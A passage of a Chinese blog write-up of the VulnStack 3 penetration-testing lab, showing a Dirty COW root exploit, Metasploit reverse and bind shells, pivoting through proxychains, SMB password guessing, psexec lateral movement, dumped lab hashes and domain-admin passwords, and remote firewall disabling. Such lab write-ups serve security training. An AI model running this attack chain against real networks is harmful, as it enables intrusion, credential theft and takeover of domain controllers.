+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>用python生成一个交互式更强的shell，方便后续操作</p>
+<p><img src="/images/image-20231111120906641.png" alt="image-20231111120906641"></p>
+<p>在本地执行后生成脏牛的提权代码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/gbonacini/CVE-2016-5195.git</span><br><span class="line">cd CVE-2016-5195</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
+
+<p>上传到目标机器执行，失败，貌似是代码的问题，看看漏洞库的情况</p>
+<p><img src="/images/image-20231111121933193.png" alt="image-20231111121933193"></p>
+<p>选择25444.c来尝试，本地编译又有问题</p>
+<p><img src="/images/image-20231111132107454.png" alt="image-20231111132107454"></p>
+<p>最后重新找了个脏牛的代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">exp地址：https://github.com/FireFart/dirtycow</span><br><span class="line"></span><br><span class="line">gcc -pthread dirty.c -o dirty –lcrypt</span><br><span class="line"></span><br><span class="line">生成特权用户  ./dirty 12345</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20231111131504887.png" alt="image-20231111131504887"></p>
+<p><img src="/images/image-20231111131904620.png" alt="image-20231111131904620"></p>
+<p>切换到新用户</p>
+<p><img src="/images/image-20231111132258317.png" alt="image-20231111132258317"></p>
+<p>提权成功！后来看到网上有师傅说的其实该机器不用提权，实际场景提权动静比较大，我们的目标是拿下域控，提权后无非是想要达到以下几种目的，该机器只需要帮助我们配置代理方便进行横向就可以了</p>
+<ol>
+<li>添加管理员账户</li>
+<li>开关防火墙</li>
+<li>3389远程连接</li>
+<li>hash密码抓取</li>
+</ol>
+<p>最后看看nginx 配置情况验证之前的猜想</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nginx -t </span><br><span class="line">cat /etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20231112140004007.png" alt="image-20231112140004007"></p>
+<h1 id="内网探测"><a href="#内网探测" class="headerlink" title="内网探测"></a>内网探测</h1><p>msf重新监听</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line">show options</span><br><span class="line">set lport 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>运行之前的木马（记得chmod一下），上线提权后的<code>firefart</code>用户</p>
+<p><img src="/images/image-20231111132952385.png" alt="image-20231111132952385"></p>
+<p>该机器是双网卡机器，如果不给msf配置路由，那么后续的针对93网段探测是不能实现的，配置路由后，通往93网断的流量都会从session 4走</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -p                      #查看自动路由表</span><br><span class="line">run post/multi/manage/autoroute   		#添加路由</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20231111133633469.png" alt="image-20231111133633469"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/discovery/udp_probe</span><br></pre></td></tr></table></figure>
+
+<p>msf的其他几个扫描模块都不行，只能用这个udp_probe简单探测一下</p>
+<p><img src="/images/image-20231111134631788.png" alt="image-20231111134631788"></p>
+<p>发现93网段存在10，20，30三台主机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[+] Discovered NetBIOS on 192.168.93.1:137 (LAPTOP-O3LLQEKN:&lt;00&gt;:U :WORKGROUP:&lt;00&gt;:G :LAPTOP-O3LLQEKN:&lt;20&gt;:U :00:50:56:c0:00:02)</span><br><span class="line">[+] Discovered NetBIOS on 192.168.93.10:137 (WIN-8GA56TNV3MV:&lt;00&gt;:U :TEST:&lt;00&gt;:G :TEST:&lt;1c&gt;:G :WIN-8GA56TNV3MV:&lt;20&gt;:U :TEST:&lt;1b&gt;:U :00:0c:29:1f:54:d2)</span><br><span class="line">[+] Discovered DNS on 192.168.93.10:53 (Microsoft DNS)</span><br><span class="line">[+] Discovered NTP on 192.168.93.10:123 (1c0104fa00000000000abaa44c4f434ce8f8a26ea5244dbdc54f234b71b152f3e8f99338712c7ee4e8f99338712c7ee4)</span><br><span class="line">[+] Discovered NetBIOS on 192.168.93.20:137 (WIN2008:&lt;00&gt;:U :TEST:&lt;00&gt;:G :WIN2008:&lt;20&gt;:U :00:0c:29:ab:44:ec)</span><br><span class="line">[+] Discovered MSSQL on 192.168.93.20:1434</span><br></pre></td></tr></table></figure>
+
+<p>分别是win2012，win2008，win7机器</p>
+<h2 id="配置代理"><a href="#配置代理" class="headerlink" title="配置代理"></a>配置代理</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/server/socks_proxy</span><br><span class="line">set srvhost 127.0.0.1</span><br><span class="line">set srvport 1111</span><br><span class="line">set version 4a</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20231111142504070.png" alt="image-20231111142504070"></p>
+<p>一直断开，换为2222端口成功</p>
+<p><img src="/images/image-20231111143352758.png" alt="image-20231111143352758"></p>
+<p><img src="/images/image-20231111143508689.png" alt="image-20231111143508689"></p>
+<h2 id="信息搜集-1"><a href="#信息搜集-1" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>使用namp分别扫描三个主机端口开放情况，端口的开放情况决定了我们怎样攻击利用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 nmap -sT --min-rate 10000 -p- 192.168.93.10</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20231111144058320.png" alt="image-20231111144058320"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 nmap -sT --min-rate 10000 -p- 192.168.93.30</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20231111145434281.png" alt="image-20231111145434281"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 nmap -sT --min-rate 10000 -p- 192.168.93.20</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20231111145446643.png" alt="image-20231111145446643"></p>
+<p>开放了1433，445端口</p>
+<h2 id="1433端口爆破"><a href="#1433端口爆破" class="headerlink" title="1433端口爆破"></a>1433端口爆破</h2><p>这里1433爆破的时候，这边shell就会断开。尝试了多次后放弃了看了wp发现密码就是我们之前准备的数据库密码。</p>
+<h2 id="永恒之蓝尝试"><a href="#永恒之蓝尝试" class="headerlink" title="永恒之蓝尝试"></a>永恒之蓝尝试</h2><p>445开了，可以尝试永恒之蓝</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">search ms17</span><br><span class="line">use auxiliary/scanner/smb/smb_ms17_010</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20231111144523737.png" alt="image-20231111144523737"></p>
+<p>没有检测出漏洞</p>
+<p><img src="/images/image-20231111145620580.png" alt="image-20231111145620580"></p>
+<p>看看10、20主机的 80端口，没什么东西</p>
+<p><img src="/images/image-20231111152338814.png" alt="image-20231111152338814"></p>
+<p><img src="/images/image-20231111152551011.png" alt="image-20231111152551011"></p>
+<p>跑smb弱口令，跑不出来。换了很多个字典也不行。卡住了</p>
+<p><img src="/images/image-20231111154913096.png" alt="image-20231111154913096"></p>
+<p>看了wp之后了解到，密码是<code>123qwe!ASD</code>，加入字典后能跑出来，30主机密码也是这个</p>
+<p><img src="/images/image-20231111161405778.png" alt="image-20231111161405778"></p>
+<p>确定了账户密码之后，尝试通过msf自带的psexec进行横向</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">set rhost 192.168.93.30</span><br><span class="line">set SMBPass 123qwe!ASD</span><br><span class="line">set SMBUSer administrator</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20231111170153791.png" alt="image-20231111170153791"></p>
+<p>连不上诶，又试了一次又行了</p>
+<p><img src="/images/image-20231111170323659.png" alt="image-20231111170323659"></p>
+<p>两台机器的shell都拿下了，都是system权限</p>
+<p><img src="/images/image-20231111170416483.png" alt="image-20231111170416483"></p>
+<p>接下来就稍微容易了</p>
+<p>域名test.org</p>
+<p><img src="/images/image-20231111170929858.png" alt="image-20231111170929858"></p>
+<h1 id="域控上线"><a href="#域控上线" class="headerlink" title="域控上线"></a>域控上线</h1><p>30机器抓取密码，没有主导域用户的账户密码</p>
+<p><img src="/images/image-20231111172031819.png" alt="image-20231111172031819"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">creds_allmeterpreter &gt; creds_all</span><br><span class="line">[+] Running as SYSTEM</span><br><span class="line">[*] Retrieving all credentials</span><br><span class="line">msv credentials</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">Username       Domain  NTLM                              SHA1</span><br><span class="line">--------       ------  ----                              ----</span><br><span class="line">Administrator  WIN7    31c1794c5aa8547c87a8bcd0324b8337  128c0272959b85b330090611169d07d85cb6bd0b</span><br><span class="line">WIN7$          TEST    bb6b48766fb280d74babb50e781bbc21  4ebd2d435d946f95f31d5c16351791fea97e8f43</span><br><span class="line"></span><br><span class="line">wdigest credentials</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">Username       Domain  Password</span><br><span class="line">--------       ------  --------</span><br><span class="line">(null)         (null)  (null)</span><br><span class="line">Administrator  WIN7    123qwe!ASD</span><br><span class="line">WIN7$          TEST    Xp:b4*hsKA*;!&gt;;kdR2,_xtp?kPNozV.4&lt;y:lcsCdtI73*n&lt;M)&amp;&lt;GX0hY18?&#x27;FezvRL0SIOYg-9Q`K?2sh:w!lyL&gt;&lt;H1&amp;VNLKHYW0`emOz9geR4im!xBKodB</span><br><span class="line"></span><br><span class="line">kerberos credentials</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">Username       Domain    Password</span><br><span class="line">--------       ------    --------</span><br><span class="line">(null)         (null)    (null)</span><br><span class="line">Administrator  WIN7      (null)</span><br><span class="line">win7$          TEST.ORG  (null)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
+
+<p>切换到20主机，获得域管明文密码</p>
+<p><img src="/images/image-20231111171933572.png" alt="image-20231111171933572"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; creds_kerberos</span><br><span class="line">[+] Running as SYSTEM</span><br><span class="line">[*] Retrieving kerberos credentials</span><br><span class="line">kerberos credentials</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">Username       Domain    Password</span><br><span class="line">--------       ------    --------</span><br><span class="line">(null)         (null)    (null)</span><br><span class="line">Administrator  TEST.ORG  zxcASDqw123!!</span><br><span class="line">Administrator  WIN2008   123qwe!ASD</span><br><span class="line">win2008$       TEST.ORG  94 1f 08 44 5a 0c 6d 4d dd a9 9d 09 7a d0 72 bb e9 81 69 7e 96 9f 78 74 f2 9e d3 f2 98 74 7a 2f 49 4e b7 18 01 e5 94 75 8f 57 11 44 d4 31</span><br><span class="line">                         17 92 25 2a d4 96 73 36 95 87 ec 34 e8 96 74 8f b6 0a ef 05 17 af 2e 5b 08 f7 6c 4e ad 9c 3e b0 e1 c8 2f 8f bd e3 b2 e7 81 17 09 96 f6 75</span><br><span class="line">                         b5 0d c1 e1 61 07 d2 a8 99 e5 5f 7d e9 0c 76 a3 7e 51 e5 f1 d0 f0 da c5 0c 88 d0 1c 59 34 b9 3e 14 ab a1 7b 56 cd 9d 67 d3 19 c7 ad d9 b2</span><br><span class="line">                         8d 72 e9 2a c2 d0 be ff e7 e7 d2 60 85 9a 99 74 8c d5 0a b5 1c 58 31 28 de 15 51 36 58 8a da 3a db 61 5d be f9 d5 b8 a8 5c fe 19 06 f6 ac</span><br><span class="line">                         ac 26 6d 22 80 e3 f4 f6 49 f8 92 78 9b a7 36 6d f7 c4 10 a3 8e 19 83 c5 84 ff 3f fc 9c 35 81 2d 35 42 8a 30 5a 7e ca ee 3f 50 0b c8 c6 68</span><br><span class="line">                         a8 24 cc c0 52 5e b8 37 30 b7</span><br></pre></td></tr></table></figure>
+
+<p>那么猜测10应该就是域控了，尝试用psexec直接上线10域控</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/psexec) &gt; set rhost 192.168.93.10</span><br><span class="line">rhost =&gt; 192.168.93.10</span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; set smbdomain test.org</span><br><span class="line">smbdomain =&gt; test.org</span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; set smbpass</span><br><span class="line">smbpass =&gt; 123qwe!ASD</span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; set smbpass zxcASDqw123!!</span><br><span class="line">smbpass =&gt; zxcASDqw123!!</span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; set smbuser administrator</span><br></pre></td></tr></table></figure>
+
+<p>这里psexec域控总是失败上不去，那就考虑用远程桌面配合sc服务上线</p>
+<p>开启30主机的远程桌面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections</span><br><span class="line"></span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20231111195835925.png" alt="image-20231111195835925"></p>
+<p>本机配置全局代理，走的是本地2222端口（之前msf设置的1111，但是后面连接断了几次，重新设置过）</p>
+<p><img src="/images/image-20231111200453198.png" alt="image-20231111200453198"></p>
+<p><img src="/images/image-20231111200421919.png" alt="image-20231111200421919"></p>
+<p>成功远程桌面到30机器</p>
+<p><img src="/images/image-20231111200433680.png" alt="image-20231111200433680"></p>
+<p>建立ipc连接</p>
+<p><img src="/images/image-20231111200733630.png" alt="image-20231111200733630"></p>
+<p>将msf的正向木马传上去</p>
+<p><img src="/images/image-20231111203706708.png" alt="image-20231111203706708"></p>
+<p><img src="/images/image-20231111203555819.png" alt="image-20231111203555819"></p>
+<p><img src="/images/image-20231111210803047.png" alt="image-20231111210803047"></p>
+<p>弹不成功，本地测试发现文件打不开，x86和x64都试了还是不行。</p>
+<p><img src="/images/image-20231111204933334.png" alt="image-20231111204933334"></p>
+<p>不知道是有防火墙还是有杀毒，先尝试利用服务关闭防火墙</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc \\192.168.93.10 create wall binpath= &quot;netsh advfirewall set allprofiles state off&quot;</span><br><span class="line">sc \\192.168.93.10 start wall</span><br></pre></td></tr></table></figure>
+
+<p>再次利用psexec横向尝试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set rhost 192.168.93.10</span><br><span class="line">set SMBUser administrator</span><br><span class="line">set SMBPass zxcASDqw123!!</span><br><span class="line">set SMBdomain test</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20231111205432905.png" alt="image-20231111205432905"></p>
+<p>成功上线域控</p>
+<p><img src="/images/image-20231111205714902.png" alt="image-20231111205714902"></p>
+<p>远程桌面上去看看，确定结果</p>
+<p><img src="/images/image-20231112145828824.png" alt="image-20231112145828824"></p>
+<p>拿域控还有很多方法，比如当psexec不可行的时候，直接通过impacket工具包来，或者wmiexec也可以</p>
+<h1 id="纠错"><a href="#纠错" class="headerlink" title="纠错"></a>纠错</h1><p>之前sc命令不能运行和exe无法执行，是因为下面的LPORT中我少写了个T，导致生成的exe错误（这里在mac里面不会提示命令错误，但是kali里面会提示，麻了）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp LHOST=192.168.3.61 LPORT=4444 -f exe &gt; win64.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20231111212412909.png" alt="image-20231111212412909"></p>
+<p>修改后重新用sc服务就成功上线了</p>
+<p><img src="/images/image-20231111212710750.png" alt="image-20231111212710750"></p>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10057">https://xz.aliyun.com/t/10057</a></p>
+<p><a target="_blank" rel="noopener" href="http://myblog.ac.cn/archives/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B9%8Battck3">http://myblog.ac.cn/archives/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B9%8Battck3</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9757">https://xz.aliyun.com/t/9757</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://drblack.top">Drblack</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://drblack.top/2023/11/12/Vuln-stack%203/">https://drblack.top/2023/11/12/Vuln-stack%203/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://drblack.top" target="_blank">Drblack'Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/vulnstack/">vulnstack</a></div><div class="post_share"><div class="social-share" data-image="/img/1000.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2023/11/08/PTH%E3%80%81PTK%E3%80%81PTT%E6%94%BB%E5%87%BB%E6%80%BB%E7%BB%93/" title="PTH、PTT、PTK 攻击总结"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">PTH、PTT、PTK 攻击总结</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/09/21/vulnstack%202/" title="VulnStack Pass-2"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-21</div><div class="title">VulnStack Pass-2</div></div></a></div><div><a href="/2023/09/10/vulnstack%20%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/" title="VulnStack Pass-1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-10</div><div class="title">VulnStack Pass-1</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/1000.webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Drblack</div><div class="author-info__description">努力就会一直幸运</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">17</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/drblack000"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Drblack000" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:drblack_di@163.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#nmap%E6%89%AB%E6%8F%8F"><span class="toc-number">2.1.</span> <span class="toc-text">nmap扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-number">2.2.</span> <span class="toc-text">目录扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0GETSHELL"><span class="toc-number">2.3.</span> <span class="toc-text">后台GETSHELL</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">3.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%8E%A2%E6%B5%8B"><span class="toc-number">4.</span> <span class="toc-text">内网探测</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86"><span class="toc-number">4.1.</span> <span class="toc-text">配置代理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-1"><span class="toc-number">4.2.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1433%E7%AB%AF%E5%8F%A3%E7%88%86%E7%A0%B4"><span class="toc-number">4.3.</span> <span class="toc-text">1433端口爆破</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%B0%9D%E8%AF%95"><span class="toc-number">4.4.</span> <span class="toc-text">永恒之蓝尝试</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%9F%E6%8E%A7%E4%B8%8A%E7%BA%BF"><span class="toc-number">5.</span> <span class="toc-text">域控上线</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BA%A0%E9%94%99"><span class="toc-number">6.</span> <span class="toc-text">纠错</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">7.</span> <span class="toc-text">参考文章</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/11/12/Vuln-stack%203/" title="VulnStack Pass-3">VulnStack Pass-3</a><time datetime="2023-11-12T07:02:41.000Z" title="发表于 2023-11-12 15:02:41">2023-11-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/11/08/PTH%E3%80%81PTK%E3%80%81PTT%E6%94%BB%E5%87%BB%E6%80%BB%E7%BB%93/" title="PTH、PTT、PTK 攻击总结">PTH、PTT、PTK 攻击总结</a><time datetime="2023-11-08T14:10:41.000Z" title="发表于 2023-11-08 22:10:41">2023-11-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/11/04/php-SER-libs%E9%9D%B6%E5%9C%BA%E8%A7%A3%E9%A2%98/" title="php-SER-libs靶场">php-SER-libs靶场</a><time datetime="2023-11-04T02:10:41.000Z" title="发表于 2023-11-04 10:10:41">2023-11-04</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/11/02/Kerberos%E5%8D%8F%E8%AE%AE/" title="Kerberos协议分析（数据包）">Kerberos协议分析（数据包）</a><time datetime="2023-11-02T01:10:41.000Z" title="发表于 2023-11-02 09:10:41">2023-11-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/11/01/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" title="内网信息搜集">内网信息搜集</a><time datetime="2023-11-01T09:20:41.000Z" title="发表于 2023-11-01 17:20:41">2023-11-01</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Drblack</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
